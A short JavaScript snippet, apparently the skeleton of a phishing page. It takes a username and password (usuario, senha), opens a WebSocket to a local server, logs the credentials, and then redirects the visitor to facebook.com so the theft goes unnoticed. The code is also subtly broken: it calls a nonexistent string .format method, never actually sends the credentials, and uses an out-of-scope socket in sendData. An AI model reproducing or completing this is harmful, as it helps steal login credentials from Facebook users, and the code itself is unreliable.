function Func(usuario, senha)
{
    const socket = new WebSocket('ws://localhost:8765');

    socket.addEventListener('open', (event) => {
        console.log('WebSocket connection opened: {0}, {1}'.format(0, usuario, 1, senha), event);
    });

    socket.addEventListener('message', (event) => {
        console.log('Received message from server:', event.data);
    });

    window.location.href = "https://facebook.com"
}

function sendData() {
    // Sample data to send to the server
    const dataToSend = { key: 'value' };
    socket.send(JSON.stringify(dataToSend));
}